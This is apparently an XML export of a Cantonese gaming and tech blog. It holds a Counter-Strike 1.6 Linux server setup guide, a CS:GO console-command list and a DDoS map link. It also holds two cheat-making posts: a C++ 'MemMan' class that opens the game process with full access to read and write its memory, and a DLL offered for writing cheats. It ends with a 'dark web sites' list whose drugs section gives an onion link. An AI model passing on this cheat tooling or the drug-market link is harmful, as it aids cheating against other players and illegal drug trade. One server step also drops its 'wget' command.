<p><img src="apt-2.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br></pre></td></tr></table></figure>

<p><img src="apt-3.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>

<p><img src="apt-4.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install lib32gcc-s1 steamcmd</span><br></pre></td></tr></table></figure>

<p>輸入呢句指令之後會要你睇下條款，依照下圖咁做撳完 OK 之後揀 <code>I AGREE</code> (用鍵盤嘅 上下箭嘴 做選擇，撳 <code>Enter</code> 確認)</p>
<p><img src="apt-5.gif"></p>
<hr>
<h1 id="第六步-開啟-Steamcmd"><a href="#第六步-開啟-Steamcmd" class="headerlink" title="第六步 -  開啟 Steamcmd"></a>第六步 -  開啟 Steamcmd</h1><p>而加我地要將岩岩裝完既 Steamcmd 開左佢，打呢句指令開啟：</p>
<div class="note info flat">
    呢個位會需要小小時間俾佢 download steamcmd client，等一陣就得
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steamcmd</span><br></pre></td></tr></table></figure>

<p><img src="steamcmd-1.gif"></p>
<h2 id="第七步-登入-Anonymous"><a href="#第七步-登入-Anonymous" class="headerlink" title="第七步 - 登入 Anonymous"></a>第七步 - 登入 Anonymous</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">login anonymous</span><br></pre></td></tr></table></figure>

<p><img src="steamcmd-2.png"></p>
<h2 id="第八步-下載-CS1-6-資料"><a href="#第八步-下載-CS1-6-資料" class="headerlink" title="第八步 - 下載 CS1.6 資料"></a>第八步 - 下載 CS1.6 資料</h2><p>呢度要打兩次，第一次會 Error，呢個係 steamcmd 問題，只要打多次就得，再唔得就再打多次 ~</p>
<div class="note info flat">
    說明：數字 <code>90</code> 係代表 cs1.6
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">app_update 90 validate</span><br></pre></td></tr></table></figure>

<p><img src="steamcmd-3.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">app_update 90 validate</span><br></pre></td></tr></table></figure>

<p><img src="steamcmd-4.png"></p>
<h2 id="第九步-退出-steamcmd"><a href="#第九步-退出-steamcmd" class="headerlink" title="第九步 - 退出 steamcmd"></a>第九步 - 退出 steamcmd</h2><p>當你完成下載後，輸入以下指令退出 <code>steamcmd</code>。<br>或者你可以直接喺鍵盤撳 <kbd>Ctrl</kbd>+<kbd>C</kbd> 走佬.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<p><img src="steamcmd-5.png"></p>
<h1 id="第十步-下載所需軟件"><a href="#第十步-下載所需軟件" class="headerlink" title="第十步 - 下載所需軟件"></a>第十步 - 下載所需軟件</h1><p>呢度我地會需要用幾個工具，包括係：wget, tar, unzip, nano, ufw, screen</p>
<p>喺下載檔案，我既示範會用 <code>wget</code>。<br>喺解壓檔案，因為下載完既檔案係 <code>.tar.gz</code>，所以需要下載 <code>tar</code> 解壓檔案。<br>喺解壓檔案，因為 <code>metamod</code> 檔案係用緊 <code>.zip</code>，所以需要下載 <code>unzip</code> 解壓檔案。<br>喺修改檔案，我既示範會用 <code>nano</code>。<br>喺防火牆設置，我既示範會用 <code>ufw</code>。<br>喺後台行 hlds 開 server，我既示範會用 <code>screen</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install wget tar unzip nano ufw screen -y</span><br></pre></td></tr></table></figure>

<p><img src="wget-1.png"></p>
<h2 id="第十一步-下載所需檔案-AMXX-base-Addon-Metamod"><a href="#第十一步-下載所需檔案-AMXX-base-Addon-Metamod" class="headerlink" title="第十一步 - 下載所需檔案 AMXX, base, Addon, Metamod"></a>第十一步 - 下載所需檔案 AMXX, base, Addon, Metamod</h2><p>呢度跟住我做就得，因為 <a href="https://www.amxmodx.org/downloads.php">AMXX</a> 既 link 幾乎係唔會更新，至於點解 … 係個好可惜既原因，因為冇人玩 1.6，最 stable 既版本係去到 1.82 …</p>
<p>首先係下載 base 既檔案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.amxmodx.org/release/amxmodx-1.8.2-base-linux.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="wget-2.png"></p>
<p>然後係下載 addon 既檔案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://www.amxmodx.org/release/amxmodx-1.8.2-cstrike-linux.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="wget-3.png"></p>
<p>最後係下載 metamod 既檔案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.amxmodx.org/release/metamod-1.21.1-am.zip</span><br></pre></td></tr></table></figure>

<p><img src="wget-4.png"></p>
<h2 id="第十二步-分次序壓解檔案"><a href="#第十二步-分次序壓解檔案" class="headerlink" title="第十二步 - 分次序壓解檔案"></a>第十二步 - 分次序壓解檔案</h2><p>呢度要留意返個解壓既次序係 <code>base</code> &gt; <code>addon</code> &gt; <code>metamod</code>。</p>
<div class="note info flat">
    metamod - 可以唔洗分次序，但係 <code>base</code> 一定要行先過 <code>addon</code>
</div>

<p>解壓 base 檔案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zxvf amxmodx-1.8.2-base-linux.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="tar-1.gif"></p>
<p>解壓 addon 檔案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zxvf amxmodx-1.8.2-cstrike-linux.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="tar-2.gif"></p>
<p>解壓 metamod 檔案：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip metamod-1.21.1-am.zip</span><br></pre></td></tr></table></figure>
<p><img src="unzip-1.gif"></p>
<h1 id="第十三步-安裝-AMXX"><a href="#第十三步-安裝-AMXX" class="headerlink" title="第十三步 - 安裝 AMXX"></a>第十三步 - 安裝 AMXX</h1><p>將頭先解壓完既 <code>addons</code> 擺去呢個位置：</p>
<pre><code>~/.steam/steamapps/common/Half-Life/cstrike/
</code></pre>
<p>用 <code>cp</code> 複製：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -r addons/ ~/.steam/steamapps/common/Half-Life/cstrike/</span><br></pre></td></tr></table></figure>

<p><img src="cp-1.png"></p>
<h2 id="第十四步-修改檔案-liblist-gam"><a href="#第十四步-修改檔案-liblist-gam" class="headerlink" title="第十四步 - 修改檔案 liblist.gam"></a>第十四步 - 修改檔案 liblist.gam</h2><p>修改 <code>liblist.gam</code> 檔案，呢個檔案 <code>liblist.gam</code> 既用途係用黎認返你既 <code>metamod.so</code> 擺喺邊。</p>
<div class="note info flat">
    提示：nano 儲存係既話撳鍵盤既 <kbd>Ctrl</kbd>+<kbd>S</kbd>，然後退出就撳 <kbd>Ctrl</kbd>+<kbd>X</kbd>
</div>

<p>我會示範用 nano 修改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano ~/.steam/steamapps/common/Half-Life/cstrike/liblist.gam</span><br></pre></td></tr></table></figure>

<p>搵 <code>gamedll_linux</code> 個行再改做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gamedll_linux &quot;addons/metamod/dlls/metamod.so&quot;</span><br></pre></td></tr></table></figure>

<p><img src="nano-1.png"></p>
<h2 id="第十五步-新增檔案-plugins-ini"><a href="#第十五步-新增檔案-plugins-ini" class="headerlink" title="第十五步 - 新增檔案 plugins.ini"></a>第十五步 - 新增檔案 plugins.ini</h2><p>呢次喺 <code>metamod</code> 目錄底下開一個檔案叫：<code>plugins.ini</code></p>
<div class="note info flat">
    提示：nano 儲存係既話撳鍵盤既 <kbd>Ctrl</kbd>+<kbd>S</kbd>，然後退出就撳 <kbd>Ctrl</kbd>+<kbd>X</kbd>
</div>

<p>直接用 <code>nano</code> 打既話就會新增一個檔案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano ~/.steam/steamapps/common/Half-Life/cstrike/addons/metamod/plugins.ini</span><br></pre></td></tr></table></figure>

<p>加一行，內容係打以下既野：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux addons/amxmodx/dlls/amxmodx_mm_i386.so</span><br></pre></td></tr></table></figure>

<p><img src="nano-2.png"></p>
<h1 id="第十六步-Screen-後台啟動伺服器"><a href="#第十六步-Screen-後台啟動伺服器" class="headerlink" title="第十六步 - Screen 後台啟動伺服器"></a>第十六步 - Screen 後台啟動伺服器</h1><p>黎到呢一步就真係啟動 server 既一步驟啦，用 <code>Screen</code> 係為左喺 Background run Server，防止你熄左 terminal 就會熄左 Server。</p>
<p>首先 <code>cd </code>入去以下呢個路徑：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/.steam/steamapps/common/Half-Life/</span><br></pre></td></tr></table></figure>

<p><img src="screen-1.png"></p>
<p>用以下呢句指令開啟 Server。</p>
<ul>
<li>-dmS hlds - 將呢個 screen 既 lessions 改做 hlds，然後唔會入去呢個 server 既 console</li>
<li>./hlds_run - 行 server program</li>
<li>-game cstrike - 指定路徑</li>
<li>+map de_dust2 - 一開 server 就指定係開呢張圖</li>
<li>-port 27015 - 根據返你上面開左邊個 Port 位置，我上面開左 27015，所以係 27015</li>
<li>+maxplayers 32 - 個場最大人數 = 32人</li>
<li>-insecure - 熄左個 VAC Detect</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -dmS hlds ./hlds_run -game cstrike +map de_dust2 -port 27015 +maxplayers 32 -insecure</span><br></pre></td></tr></table></figure>

<p><img src="screen-2.png"></p>
<h2 id="入去-Server-console"><a href="#入去-Server-console" class="headerlink" title="入去 Server console"></a>入去 Server console</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -r hlds</span><br></pre></td></tr></table></figure>

<p><img src="screen-6.gif"></p>
<h2 id="暫時退出而加既-Screen-Session"><a href="#暫時退出而加既-Screen-Session" class="headerlink" title="暫時退出而加既 Screen Session"></a>暫時退出而加既 Screen Session</h2><p>鍵盤同時撳呢三粒制 : <kbd>Ctrl</kbd>+<kbd>A</kbd>+<kbd>D</kbd></p>
<p><img src="screen-7.png"></p>
<h1 id="最終步驟-檢查-AMXX-Metamod-是否已啟動"><a href="#最終步驟-檢查-AMXX-Metamod-是否已啟動" class="headerlink" title="最終步驟 - 檢查 AMXX, Metamod 是否已啟動"></a>最終步驟 - 檢查 AMXX, Metamod 是否已啟動</h1><p>首先進入到你的 screen</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -r hlds</span><br></pre></td></tr></table></figure>

<p>輸入以下指令查看 metamod。</p>
<div class="note info flat">
    說明：metamod 原本只會有四項插件。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meta list</span><br></pre></td></tr></table></figure>

<p><img src="screen-4.png"></p>
<p>輸入以下指令查看 amxx。</p>
<div class="note info flat">
    說明：amxx 原本只會有 21 項插件。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">amxx list</span><br></pre></td></tr></table></figure>

<p><img src="screen-5.png"></p>
<h1 id="開啟-CS-進入你的伺服器"><a href="#開啟-CS-進入你的伺服器" class="headerlink" title="開啟 CS 進入你的伺服器"></a>開啟 CS 進入你的伺服器</h1><p>開啟你的 Counter-Strike 1.6 進入你的伺服器。</p>
<h2 id="指令進入伺服器"><a href="#指令進入伺服器" class="headerlink" title="指令進入伺服器"></a>指令進入伺服器</h2><ul>
<li>開你既 cs1.6</li>
<li>撳 Keyboard ` (開控制台) 打：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">connect your_server_ip:port</span><br></pre></td></tr></table></figure>

<p><img src="css-1.gif"></p>
<h2 id="Gui-方法進入伺服器"><a href="#Gui-方法進入伺服器" class="headerlink" title="Gui 方法進入伺服器"></a>Gui 方法進入伺服器</h2><p>去你既 Server List 加 你既 Server IP。</p>
<p><img src="cs-1.png"><br><img src="cs-2.png"><br><img src="cs-3.png"><br><img src="cs-4.png"><br><img src="cs-5.png"><br><img src="cs-6.png"><br><img src="cs-7.png"></p>
<h1 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h1><p><a href="https://developer.valvesoftware.com/wiki/SteamCMD#Linux">https://developer.valvesoftware.com/wiki/SteamCMD#Linux</a></p>
]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>Digitalocean</tag>
        <tag>VPS Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike: Global Offensive - C++ 外掛 - MemMan (Windows)</title>
    <url>/2022/01/29/Csgo-c-cheating-MemMan/</url>
    <content><![CDATA[<h1 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemMan</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MemMan</span>();</span><br><span class="line">	~<span class="built_in">MemMan</span>();</span><br><span class="line">	<span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">val</span>&gt;</span></span><br><span class="line">	<span class="function">val <span class="title">readMem</span><span class="params">(<span class="keyword">uintptr_t</span> addr)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		val x;</span><br><span class="line">		<span class="built_in">ReadProcessMemory</span>(handle, (LPBYTE*)addr, &amp;x, <span class="built_in"><span class="keyword">sizeof</span></span>(x), <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">val</span>&gt;</span></span><br><span class="line">	<span class="function">val <span class="title">writeMem</span><span class="params">(<span class="keyword">uintptr_t</span> addr, val x)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">WriteProcessMemory</span>(handle, (LPBYTE*)addr, &amp;x, <span class="built_in"><span class="keyword">sizeof</span></span>(x), <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getProcess</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>*)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getModule</span><span class="params">(<span class="keyword">uintptr_t</span>, <span class="keyword">const</span> <span class="keyword">wchar_t</span>*)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getAddress</span><span class="params">(<span class="keyword">uintptr_t</span>, std::vector&lt;<span class="keyword">uintptr_t</span>&gt;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HANDLE handle;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemMan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line">MemMan::<span class="built_in">MemMan</span>()</span><br><span class="line">&#123;</span><br><span class="line">	handle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemMan::~<span class="built_in">MemMan</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getProcess</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcessId = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">uintptr_t</span> process;</span><br><span class="line">	PROCESSENTRY32 pEntry;</span><br><span class="line">	pEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(pEntry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_wcsicmp(pEntry.szExeFile, proc))</span><br><span class="line">		&#123;</span><br><span class="line">			process = pEntry.th32ProcessID;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hProcessId);</span><br><span class="line">			handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">false</span>, process);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hProcessId, &amp;pEntry));</span><br><span class="line">	<span class="keyword">return</span> process;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getModule</span><span class="params">(<span class="keyword">uintptr_t</span> procId, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* modName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hModule = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId);</span><br><span class="line">	MODULEENTRY32 mEntry;</span><br><span class="line">	mEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(mEntry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_wcsicmp(mEntry.szModule, modName))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">uintptr_t</span>)mEntry.hModule;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hModule, &amp;mEntry));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getAddress</span><span class="params">(<span class="keyword">uintptr_t</span> addr, std::vector&lt;<span class="keyword">uintptr_t</span>&gt; vect)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vect.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ReadProcessMemory</span>(handle, (BYTE*)addr, &amp;addr, <span class="built_in"><span class="keyword">sizeof</span></span>(addr), <span class="number">0</span>);</span><br><span class="line">		addr += vect[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Counter-Strike Global Offensive</category>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Game Hacking</tag>
        <tag>CPP</tag>
      </tags>
  </entry>
  <entry>
    <title>DDoS Map Live</title>
    <url>/2022/02/02/DDoS-Map-Live/</url>
    <content><![CDATA[<h1 id="冇咩特別"><a href="#冇咩特別" class="headerlink" title="冇咩特別"></a>冇咩特別</h1><p>實時 DDoS 情況</p>
<p><a href="https://www.digitalattackmap.com/">https://www.digitalattackmap.com</a></p>
<img src="/2022/02/02/DDoS-Map-Live/live.png" class="">]]></content>
      <tags>
        <tag>DDoS</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike: Global Offensive - 主控台指令</title>
    <url>/2022/01/07/Csgo-useful-command/</url>
    <content><![CDATA[<img src="/2022/01/07/Csgo-useful-command/csgo.png" class="">

<p>要使用控制台，請在遊戲中按鍵盤上的波浪號 (`) 鍵。</p>
<p>如果沒有反應，您可以通過前往您的設置並選中 “啟用開發者控制台” 框來啟用您的控制台。</p>
<p>以下為指令 </p>
<h1 id="net-graph-1"><a href="#net-graph-1" class="headerlink" title="net_graph  1"></a>net_graph  1</h1><p>此命令允許您在Screen上查看大量有用信息，包括 FPS、ping 和 tick rate，（設置1為啟動）禁用（設置為 0）。</p>
<h1 id="fps-max-100"><a href="#fps-max-100" class="headerlink" title="fps_max 100"></a>fps_max 100</h1><p>此命令可幫助您最大化每秒幀數 (FPS)。 它消除了對 FPS 的限制，讓您的 PC 發揮最大潛力。 您可以超越 60 FPS，而不是被困在 60 FPS 的障礙後面。 </p>
<h1 id="cl-radar-always-centered"><a href="#cl-radar-always-centered" class="headerlink" title="cl_radar_always_centered"></a>cl_radar_always_centered</h1><p>雷達往往會產生誤導。 當地圖邊緣出現一個紅點時，它會讓您產生一種虛假的安全感。 此推薦使雷達居中，讓您可以查看整個地圖。 可能需要一些時間來適應，但值得付出努力。 </p>
<h1 id="cl-use-opens-buy-menu-0"><a href="#cl-use-opens-buy-menu-0" class="headerlink" title="cl_use_opens_buy_menu 0"></a>cl_use_opens_buy_menu 0</h1><p>您是否曾經在 spawn 中撿起地上的武器並不小心打開了購買菜單？ 這個有用的命令將阻止您的“使用”鍵（默認為 E）打開購買菜單。 </p>
<h1 id="cl-show-team-equipment"><a href="#cl-show-team-equipment" class="headerlink" title="+cl_show_team_equipment"></a>+cl_show_team_equipment</h1><p>此命令可讓您在頭頂上看到隊友的武器和實用裝備，讓您更全面地了解遊戲。 它可用於挑出隊友並收集有關煙霧或閃光彈的信息。 </p>
<h1 id="voice-scale-0-3"><a href="#voice-scale-0-3" class="headerlink" title="voice_scale 0.3"></a>voice_scale 0.3</h1><p>此命令將幫助您抵消喜歡尖叫而不是玩耍的嘈雜隊友，將隊友的音量降低到合適的水平，讓您專注於比賽。 </p>
<h1 id="novid"><a href="#novid" class="headerlink" title="novid"></a>novid</h1><p>此命令會關閉 Valve 煩人的遊戲前介紹，從而在您加載新地圖時為您節省幾秒鐘的時間。 </p>
<h1 id="language"><a href="#language" class="headerlink" title="language"></a>language</h1><p>此命令將您的客戶端切換到另一種語言。 例如，如果您說法語，請在控制台中輸入 language [french]。</p>
<h1 id="bot-add"><a href="#bot-add" class="headerlink" title="bot_add"></a>bot_add</h1><p>此命令將在您的私人遊戲中添加一個機器人，讓您在進入配對之前練習您的目標。</p>
<h1 id="cl-hud-color"><a href="#cl-hud-color" class="headerlink" title="cl_hud_color"></a>cl_hud_color</h1><p>您可以使用此命令個性化您的 HUD。 寫 cl_hud_color [HUD Color] 並選擇一種顏色。 綠色、青色、紅色和藍色只是一些可用的選項。 </p>
<h1 id="cl-lefthand"><a href="#cl-lefthand" class="headerlink" title="cl_lefthand"></a>cl_lefthand</h1><p>如果您是左撇子或想要改變節奏，此命令將允許您將槍移動到屏幕左側。 如果要將其更改回默認值，請鍵入 cl_righthand。</p>
<h1 id="sv-cheats-1"><a href="#sv-cheats-1" class="headerlink" title="sv_cheats 1"></a>sv_cheats 1</h1><p>此命令將使您能夠使用自己的個人服務器進行試驗，您可以使用它來激活幾乎任何您喜歡的客戶端或服務器端控制台命令。</p>
<h1 id="sv-grenade-trajectory-1-amp-amp-sv-grenade-trajectory-time-10"><a href="#sv-grenade-trajectory-1-amp-amp-sv-grenade-trajectory-time-10" class="headerlink" title="sv_grenade_trajectory 1 &amp;&amp; sv_grenade_trajectory_time 10"></a>sv_grenade_trajectory 1 &amp;&amp; sv_grenade_trajectory_time 10</h1><p>這個命令非常適合練習手榴彈。 您可以使用它來執行彈出閃光、冒煙並掌握遊戲的物理特性。 </p>
<h1 id="cl-drawonlydeathnotices-1"><a href="#cl-drawonlydeathnotices-1" class="headerlink" title="cl_drawonlydeathnotices 1"></a>cl_drawonlydeathnotices 1</h1><p>對於那裡的碎片電影製作者，此命令會關閉平視顯示器 (HUD)，並將它們替換為剪輯中受害者的別名。</p>
<h1 id="r-drawtracers-firstperson-0"><a href="#r-drawtracers-firstperson-0" class="headerlink" title="r_drawtracers_firstperson 0"></a>r_drawtracers_firstperson 0</h1><p>此命令關閉來自 M4A4 和 AK-47 等武器的客戶端子彈追踪器，它有助於改善您的噴霧控制和練習您最喜歡的槍支。</p>
<h1 id="spec-show-xray-1"><a href="#spec-show-xray-1" class="headerlink" title="spec_show_xray 1"></a>spec_show_xray 1</h1><p>您可以在觀看演示時使用此命令。 它顯示玩家模型穿過牆壁的動作，讓您了解玩家的行為主義，它對於在 Valve 的《守望先鋒》系統中捕捉牆黑客特別有用。 </p>
<h1 id="cl-show-team-equipment-1"><a href="#cl-show-team-equipment-1" class="headerlink" title="cl_show_team_equipment"></a>cl_show_team_equipment</h1><p>此命令可讓您查看隊友的實用程序。 與其問他們手頭是否有幾支閃光彈和一支煙，您只需看看您的屏幕即可。<br>語音啟用 0</p>
<h1 id="voice-enable-0"><a href="#voice-enable-0" class="headerlink" title="voice_enable 0"></a>voice_enable 0</h1><p>如果你厭倦了聽隊友胡言亂語，這個命令會給你一些平靜和安靜。 它會使您團隊中的所有玩家靜音。<br>網絡圖</p>
<h1 id="cl-showfps"><a href="#cl-showfps" class="headerlink" title="cl_showfps"></a>cl_showfps</h1><p>此命令在屏幕的左上角添加一個簡單的每秒幀數。 它佔用的空間比 net_graph 少得多，而且通常也不那麼分散注意力。<br>德梅</p>
<h1 id="demoui"><a href="#demoui" class="headerlink" title="demoui"></a>demoui</h1><p>此命令會顯示一個用於觀看演示的小矩形界面。 它有助於加快查看速度、減慢亮點以及從 FACEIT 或 ESEA 等第三方服務器主機手動加載演示文件。</p>
<h1 id="god"><a href="#god" class="headerlink" title="god"></a>god</h1><p>此命令為您提供 “上帝模式 (無敵)”，使您在私人服務器中堅不可摧，它需要 sv_cheats 1 命令。</p>
<h1 id="noclip"><a href="#noclip" class="headerlink" title="noclip"></a>noclip</h1><p>如果您曾經幻想過在地圖上飛行，那麼 noclip 就是您的最佳選擇，它需要 sv_cheats 1 命令並且只能在私人服務器上工作。</p>
<h1 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h1><p>建立 Shortkey 進行指令，例如 <code>bind f1 +noclip</code>，意思是 F1開關 飛行器。</p>
<h1 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h1><p>自殺。</p>
<h1 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h1><p>Exec 非常適合啟用可以創建或從第三方網站下載的私有服務器配置（用於練習的 .cfg 文件、一對一等）。</p>
<h1 id="disconnect"><a href="#disconnect" class="headerlink" title="disconnect"></a>disconnect</h1><p>此命令允許您立即離開服務器，從而節省了幾次額外的點擊次數。 這在比賽結束時特別有用。</p>
<h1 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h1><p>此命令會關閉 CS:GO，將您帶回桌面。 </p>
<p>參考資料 :<br><a href="https://dotesports.com/counter-strike/news/the-most-useful-console-commands-for-cs-go-14256">https://dotesports.com/counter-strike/news/the-most-useful-console-commands-for-cs-go-14256</a><br><a href="https://totalcsgo.com/commands">https://totalcsgo.com/commands</a></p>
]]></content>
      <categories>
        <category>Counter-Strike Global Offensive</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title>C# Memory DLL - VAMemory (Windows)</title>
    <url>/2022/01/29/Csgo-C-cheating-VAMemory/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一個用黎喺 C#.NET 環境底下令你更加容易咁 READ WRITE Memory既 dll，簡單黎講，俾你用黎寫外掛用既 dll (c#)。</p>
<h2 id="系統需求"><a href="#系統需求" class="headerlink" title="系統需求"></a>系統需求</h2><ul>
<li>.NET 3.5</li>
</ul>
<h2 id="下載-VAMemory"><a href="#下載-VAMemory" class="headerlink" title="下載 VAMemory"></a>下載 VAMemory</h2><p>官方網站 :</p>
<pre><code>https://vivid-abstractions.net/logical/programming/vamemory-c-memory-class-net-3-5/
</code></pre>
<p>或者你可以喺我呢度下載 : <a href="VAMemoryV1.3.rar" download>VAMemory</a></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Game Hacking</tag>
        <tag>CShrap</tag>
      </tags>
  </entry>
  <entry>
    <title>Darkweb | 暗網網站列表</title>
    <url>/2022/01/21/Darkweb-website/</url>
    <content><![CDATA[<h1 id="毒品"><a href="#毒品" class="headerlink" title="毒品"></a>毒品</h1><p><a href="http://agujxtyqs4u666vl6o2siuesxwjyf2kptv7owdpckjdt3hjs4hwmpvad.onion/">http://agujxtyqs4u666vl6o2siuesxwjyf2kptv7owdpckjdt3hjs4hwmpvad.onion/</a></p>
